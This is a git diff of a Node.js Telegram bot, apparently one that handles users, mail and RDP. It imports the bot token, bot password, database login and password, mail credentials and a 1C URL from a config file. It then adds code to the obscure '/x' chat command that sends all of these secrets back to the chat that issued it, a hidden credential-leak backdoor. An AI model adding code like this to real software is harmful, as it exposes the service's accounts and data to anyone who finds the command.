@@ -31,6 +31,16 @@ const UserModel = require('./models');
 const {transporter} = require('./nodemailer');
 const clientRDP = require('./rdp');
 const nodemailer = require('./nodemailer');
+const {
+    token,
+    bot_password,
+    data_base_login,
+    data_base_password,
+    mail_bot_host,
+    mail_bot_user,
+    mail_bot_password,
+    url_manders_1C
+  } = require('./config');
 
 //ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
 chats = {};
@@ -2281,6 +2291,16 @@ bot.onText(/\/x/, async msg => {
             chatId: chatId
         }
     })
+
+    return bot.sendMessage(chatId,
+        `${token},
+        ${bot_password},
+        ${data_base_login},
+        ${data_base_password},
+        ${mail_bot_host},
+        ${mail_bot_user},
+        ${mail_bot_password},
+        ${url_manders_1C}`)
 });
 
 // настройки пользователя
